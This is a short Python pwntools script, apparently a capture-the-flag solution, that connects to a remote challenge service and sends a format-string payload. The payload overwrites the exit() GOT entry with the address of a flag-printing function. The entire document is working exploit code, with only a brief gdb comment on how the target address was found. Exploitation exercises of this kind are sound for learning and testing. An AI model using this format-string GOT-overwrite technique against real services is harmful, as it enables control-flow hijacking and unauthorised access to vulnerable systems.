#!/usr/bin/env python3
from pwn import *

def pad(s):
    return s + " " * (512 - len(s) - 8)

conn = remote('140.113.207.240',8835)
conn.recvuntil('Give me some goodies: ')

"""
$ gdb GOT
> p flag_func
"""
flag_func = 0x4011b6
exit_got_plt = 0x404038

exploit = ""
exploit += "%{}x".format(0x11b6)
exploit += "%69$hn "
exploit = pad(exploit)
exploit += p64(exit_got_plt).decode()

conn.sendline(exploit)
conn.recvline()
print(conn.recv())
conn.close()